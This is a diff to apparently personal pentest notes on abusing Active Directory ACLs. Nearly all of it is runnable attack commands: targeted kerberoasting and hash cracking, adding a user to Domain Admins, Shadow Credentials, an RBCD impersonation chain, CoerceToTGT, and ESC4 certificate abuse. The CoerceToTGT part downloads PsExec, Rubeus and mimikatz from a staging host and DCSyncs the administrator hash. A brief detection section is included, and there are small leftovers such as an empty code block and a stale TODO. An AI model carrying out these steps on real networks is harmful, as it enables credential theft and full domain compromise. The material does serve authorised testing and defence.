@@ -148,6 +148,38 @@ $ net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S
 ```
 
 ---
+## GenericWrite over a User
+
+We can perform a kerberoasting attack and extract the victim AD users NTLM hash.
+
+**Windows**
+
+```powershell
+PS C:\> powershell -ep bypass
+
+PS C:\> Import-Module .PowerView.ps1
+
+PS C:\> Set-DomainObject -Identity 'TARGET_AD_USER' -Set @{serviceprincipalname='nonexistent/hacking'}
+
+PS C:\> Get-DomainUser 'TARGET_AD_USER' | Select serviceprincipalname
+
+PS C:\> $User = Get-DomainUser 'TARGET_AD_USER'
+
+PS C:\> $User | Get-DomainSPNTicket # this will output the NTLM hash
+```
+
+**Linux**
+
+```bash
+./targetedKerberoast.py --dc-ip 'DC_IP' -v -d 'DOMAIN' -u 'AD_USER' -p 'PASSWORD'
+```
+
+We can crack the hash with:
+```bash
+$ hashcat -m 13100 user.hash /usr/share/wordlists/rockyou.txt --force
+```
+
+---
 ## GenericAll over Computer
 
 Check: https://github.com/tothi/rbcd-attack
@@ -233,6 +265,48 @@ PS C:\> Add-DomainObjectAcl -Credential $Cred -Rights DCSync -PrincipalIdentity 
 Grant DcSync privileges:
 ```bash
 $ dacledit.py -action 'write' -rights 'DCSync' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'
+```
+
+## WriteDacl over Group
+
+**Windows**
+
+- Grant Full control (from session with controlled user with rights):
+```powershell
+PS C:\> powershell -ep bypass
+PS C:\> Import-Module .PowerView.ps1
+PS C:\> Add-DomainObjectAcl -Rights 'All' -TargetIdentity "Domain Admins" -PrincipalIdentity "rudra"
+```
+
+- Add members to the group:
+```powershell
+C:\> net group "domain admins" rudra /add /domain
+```
+
+- Check:
+```
+C:\> net group "GROUP" /domain
+```
+
+**Linux**
+
+- Grant controlled user Full Control over the Group:
+```bash
+$ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'CONTROLLED_USER' -target-dn 'CN=Domain Admins,CN=Users,DC=ignite,DC=local' 'ignite.local'/'rudra':'Password@1' -dc-ip 192.168.1.3
+
+# Parameters:
+# -princial: contolled user which has WriteDacl rights over group
+# -target-dn: target group DN (we can get it by selecting in BloodHound the group and look for the DN)
+# -hashes :NTLM: PtH
+```
+
+- Add members to the group:
+```bash
+$ net rpc group addmem "Domain Admins" rudra -U ignite.local/rudra%'Password@1' -S 192.168.1.3
+
+# Parameters:
+# --password: password or NT hash (use with below flag in case of the latest)
+# --pw-nt-hash: PtH
 ```
 
 ## GetChanges/GetChangesAll over Domain
@@ -410,15 +484,116 @@ $ impacket-secretsdump -k -no-pass dc.painters.htb # recommended
 
 Reference: [Shadow Credentials Attack](https://www.hackingarticles.in/shadow-credentials-attack/)
 
-Allows the user to create a shadow credential on a computer and authenticate as the principal using kerberos PKINT
+Allows the user to create a shadow credential on a computer and authenticate as the principal using kerberos PKINIT.
+
+> [!Requirements]
+> `GenericWrite`/`GenericAll`/`WriteProperty` over the target object **and** a domain that supports PKINIT (an ADCS/PKI infrastructure — see [[Attacking Active Directory Certificate Services]]). The abuse writes to the target's `msDS-KeyCredentialLink` attribute.
 
 **Linux**
 
-```
+1. Add a shadow credential (key pair) to the target account. `pywhisker` outputs a `.pfx` and its password:
+```bash
 pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"
+
+# Parameters:
+# -d: domain FQDN
+# -u/-p: the controlled account that holds the write privilege (use -H for PtH)
+# --target: victim user/computer whose msDS-KeyCredentialLink we write
+# --action add: create and attach the key credential (list / remove / clear also available)
 ```
 
+2. Use the generated certificate to request a TGT via PKINIT and dump the target's NT hash:
+```bash
+# PKINITtools
+python3 gettgtpkinit.py -cert-pfx target.pfx -pfx-pass <PFX_PASSWORD> "domain.local/targetAccount" target.ccache
+export KRB5CCNAME=target.ccache
+python3 getnthash.py -key <AS-REP_KEY> "domain.local/targetAccount"
+
+# Or, in one step with certipy:
+certipy-ad auth -pfx target.pfx -username targetAccount -domain domain.local -dc-ip <DC_IP>
+```
+
+3. Reuse the recovered TGT/NT hash for [[Pass the Ticket (PtT)]] or [[Pass the Hash (PtH)]] lateral movement.
+
+> [!Note]
+> Clean up afterwards with `--action clear` (or `remove`) to delete the shadow credential you added to `msDS-KeyCredentialLink`.
+
+**Windows**
+
+Same attack from a Windows foothold using `Whisker.exe` (writes the KeyCredential) together with `Rubeus` (PKINIT auth):
+```powershell
+# 1. Add the shadow credential; Whisker prints a ready-to-use Rubeus command + password
+PS C:\> .\Whisker.exe add /target:"targetAccount" /domain:"domain.local" /dc:"dc.domain.local"
+
+# 2. Request a TGT via PKINIT with the generated cert and dump the NT hash (/getcredentials)
+PS C:\> .\Rubeus.exe asktgt /user:"targetAccount" /certificate:<BASE64_PFX> /password:"<PFX_PASSWORD>" /domain:"domain.local" /dc:"dc.domain.local" /getcredentials /show
+
+# 3. Clean up the attribute afterwards
+PS C:\> .\Whisker.exe remove /target:"targetAccount" /domain:"domain.local" /dc:"dc.domain.local" /deviceid:<GUID>
+```
+
+> [!Tip]
+> The recovered TGT / NT hash feeds straight into [[Pass the Ticket (PtT)]] or [[Pass the Hash (PtH)]]. Shadow Credentials is preferred over `ForceChangePassword` because it is non-destructive — the legitimate user keeps their password.
+
+---
+## Resource-Based Constrained Delegation (RBCD) — worked example against a Computer object
+
+When we hold `GenericWrite` / `GenericAll` / `WriteProperty` (or explicitly `WriteAccountRestrictions`) over a **computer object**, we can write to its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute and abuse **Resource-Based Constrained Delegation** to impersonate any user (including a Domain Admin) *on that computer*.
+
+> [!Requirements]
+> - Write privilege over the **target computer** object (the resource we want to compromise).
+> - A controlled account **with an SPN** to act as the delegated-to principal. If we don't control one, we can create a machine account ourselves — by default any domain user can add up to 10 (`ms-DS-MachineAccountQuota = 10`).
+
+**Linux (Impacket + PKINIT-less flow)**
+
+1. Create a computer account we control (provides the SPN needed for S4U):
+```bash
+$ impacket-addcomputer -computer-name 'ATTACKER$' -computer-pass 'Passw0rd!' \
+    -dc-host <DC_FQDN> 'domain.local/controlledUser:password'
+```
+
+2. Write our new machine into the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` (the RBCD edge):
+```bash
+$ impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' -action write \
+    'domain.local/controlledUser:password'
+```
+
+3. Perform the S4U2self + S4U2proxy chain to obtain a service ticket impersonating a privileged user (e.g. `administrator`) for a service on the target:
+```bash
+$ impacket-getST -spn 'cifs/target.domain.local' -impersonate administrator \
+    'domain.local/ATTACKER$:Passw0rd!'
+$ export KRB5CCNAME=administrator.ccache
+```
+
+4. Use the ticket for access — e.g. SMB / remote execution against the target (see [[Pass the Ticket (PtT)]]):
+```bash
+$ impacket-psexec -k -no-pass target.domain.local
+```
+
+> [!Tip]
+> Pick the `-spn` service class for the action you need (`cifs` for SMB/psexec, `host` for WMI). See [[Service Map]] for the SPN → action mapping. Clean up afterwards with `impacket-rbcd -action remove`.
+
+**Windows (PowerView + Rubeus)**
+
+```powershell
+# 1. Write the RBCD attribute so ATTACKER$ can act on behalf of others against TARGET$
+PS C:\> $sid = (Get-DomainComputer ATTACKER -Properties objectsid).objectsid
+PS C:\> $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
+PS C:\> $bytes = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($bytes,0)
+PS C:\> Set-DomainObject -Identity TARGET$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$bytes}
+
+# 2. Compute the AES/RC4 hash of ATTACKER$'s password, then run S4U with Rubeus
+PS C:\> .\Rubeus.exe hash /password:Passw0rd! /user:ATTACKER$ /domain:domain.local
+PS C:\> .\Rubeus.exe s4u /user:ATTACKER$ /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
+```
+
+<!-- TODO: add a worked example against a Computer object (RBCD chain) and a detection/mitigation note (msDS-KeyCredentialLink auditing). Marker kept for traceability. -->
 TODO
+
+> [!Note] Detection & mitigation
+> - **Shadow Credentials (`msDS-KeyCredentialLink`)**: enable auditing on the attribute (SACL / Event ID `5136` — Directory Service object modified) and alert on writes to `msDS-KeyCredentialLink` outside of legitimate device-registration flows. Tools like the [Whisker/pyWhisker] cleanup leave a window where the attribute is populated — periodic review with `Get-ADComputer -Properties msDS-KeyCredentialLink` (or ADCSKiller / the `nifty` LDAP queries) surfaces stale entries.
+> - **RBCD**: monitor writes to `msDS-AllowedToActOnBehalfOfOtherIdentity` (Event ID `5136`), and set `ms-DS-MachineAccountQuota = 0` to stop unprivileged users creating the machine accounts these attacks rely on.
+> - **General ACL hygiene**: run [[AD Automatic Enumeration (BloodHound)]] from the *defender* side to find dangerous edges (`GenericAll`, `WriteDacl`, `ForceChangePassword`) and tighten delegated permissions on Tier-0 assets.
 
 ---
 # WriteOwner of User -> Group
@@ -470,6 +645,13 @@ net user CONTROLLED_USER
 
 > [!Note]
 > In case of Group, a controlled user must belong to the group with the privileges
+
+**Enumeration**
+
+1. Download [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) and import it:
+```
+
+```
 
 **Windows**
 
@@ -536,6 +718,76 @@ CIFS -> impacket-psexec -k -no-pass DOMAIN/administrator@IP
 
 ```
 
+---
+# CoerceToTGT (Host to Domain)
+
+1. Access the host with CoerceToTGT privileges over the domain in the context of a domain user account (it can be the computer account too via PsExec):
+```powershell
+# Windows
+PS C:\> wget -uri http://192.168.45.161/PsExec64.exe -Outfile C:\Windows\Temp\PsExec64.exe
+
+PS C:\> C:\Windows\Temp\PsExec64.exe -accepteula -i -s powershell.exe
+
+# Linux
+$ impacket-psexec AD_USER@TARGET
+```
+
+> [!Note]
+> We need to execute rubeus from a terminal executed from a domain joined user. If we are NT Authority System we are executing from the computer account, which is domain joined.
+
+2. Start monitoring for TGTs:
+```powershell
+PS C:\> wget -uri http://192.168.45.161/Rubeus.exe -Outfile C:\Windows\Temp\Rubeus.exe
+
+C:\Windows\Temp\Rubeus.exe monitor /user:TARGET_DC$ /interval:5 /nowrap
+```
+
+3. Coerce target DC:
+
+Access as a domain user to any other computer in the domain:
+```powershell
+# Windows (we can also use runas.exe)
+PS C:\> wget -uri http://192.168.45.161/PsExec64.exe -Outfile C:\Windows\Temp\PsExec64.exe
+
+PS C:\>C:\Windows\Temp\PsExec64.exe -accepteula -i -s powershell.exe
+
+# Linux
+$ impacket-psexec AD_USER@AD_MACHINE
+```
+
+Upload SpoolSample and coerce the target DC:
+```powershell
+PS C:\> wget -uri http://192.168.45.161/SpoolSample.exe -Outfile C:\Windows\Temp\SpoolSample.exe
+
+PS C:\> C:\Windows\Temp\SpoolSample.exe DC_HOSTNAME CoerceToTGT_AD_HOSTNAME
+
+# Parameters:
+# CoerceToTGT_AD_HOST: hostname of the machine listening for TGTs and with CoerceToTGT privilege over the domain
+```
+
+Check rubeus for incoming TGTs as the target DC$ computer account.
+
+3. Pass the ticket:
+
+Inject the DC TGT into memory using Rubeus on any computer in the domain:
+```powershell
+PS C:\> C:\Windows\Temp\Rubeus.exe ptt /ticket:doIFvjCCBbqgAwI...
+```
+
+4. DCSync the target domain
+
+Use mimikatz to DCSync the domain from the computer where the DC TGT was injected:
+```powershell
+PS C:\> wget -uri http://192.168.45.161/mimikatz.exe -Outfile C:\Windows\Temp\mimikatz.exe
+
+PS C:\> C:\Windows\Temp\mimikatz.exe
+
+mimikatz> lsadump::dcsync /domain:DC_FQDN /user:DOMAIN_NAME\Administrator
+```
+
+We have now the domain administrator NTLM hash, compromising the entire domain.
+
+---
 # CS template with dangerous ACEs / ManageCA privilege
 
 > [!Important]
@@ -692,4 +944,46 @@ PS C:\> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName 
 3. Set the password for the `damundsen` user back to its original value (if we know it) or have our client set it/alert the user
 
 # CS template with dangerous ACEs (ESC4)
+
+ESC4 is when our controlled principal has **write privileges** (`GenericWrite`, `WriteDacl`, `WriteOwner`, `WriteProperty`...) over a **certificate template** object itself. Instead of abusing an already-misconfigured template, we *make* a template vulnerable: overwrite its configuration to look like ESC1 (enrollee-supplies-subject + client-authentication EKU), enroll impersonating a Domain Admin, then restore the original settings.
+
+**Linux (certipy)**
+
+1. Enumerate templates and confirm the write ACE over the template:
+```bash
+$ certipy-ad find -u 'USER@DOMAIN_FQDN' -p 'PASSWORD' -dc-ip DC_IP -vulnerable -stdout
+# Look for a template where our user/group has Write Owner / Write Dacl / Write Property
+```
+
+2. Overwrite the template to make it ESC1-abusable (certipy saves the old config for restore):
+```bash
+$ certipy-ad template -u 'USER@DOMAIN_FQDN' -p 'PASSWORD' -template TEMPLATE_NAME -write-default-configuration -save-old
+```
+
+3. Request a certificate impersonating a privileged user (this is now a standard ESC1 request):
+```bash
+$ certipy-ad req -u 'USER@DOMAIN_FQDN' -p 'PASSWORD' -ca 'CA_NAME' -template TEMPLATE_NAME -upn administrator@DOMAIN_FQDN -dc-ip DC_IP
+```
+
+4. Authenticate with the issued certificate to recover the target NT hash / TGT:
+```bash
+$ certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP
+```
+
+5. **Restore** the template to its original configuration to reduce footprint:
+```bash
+$ certipy-ad template -u 'USER@DOMAIN_FQDN' -p 'PASSWORD' -template TEMPLATE_NAME -configuration TEMPLATE_NAME.json
+```
+
+> [!Note]
+> The full ESC1/ESC7/ESC8 methodology and the ADCS background live in [[Attacking Active Directory Certificate Services]]. This section only covers reaching those attacks *through* an ACL write over the template object.
+
+---
+### Related notes
+- [[Kerberoasting]] and [[AS-REP Roasting]] — the roasting attacks unlocked by `GenericWrite`/`GenericAll` over a user.
+- [[Kerberos Delegation]] — RBCD is the primary abuse of `GenericAll`/`GenericWrite` over a **computer** object.
+- [[AD DCSync]] — end goal of `WriteDacl` over the domain (granting `DS-Replication-Get-Changes*`).
+- [[Attacking Active Directory Certificate Services]] — ESC1/ESC4/ESC7/ESC8 certificate abuse.
+- [[Pass the Hash (PtH)]] and [[Pass the Ticket (PtT)]] — reusing the credentials/tickets obtained here.
+- [[AD Enumeration with PowerView]] and [[AD Automatic Enumeration (BloodHound)]] — mapping these ACL edges before abuse.
 
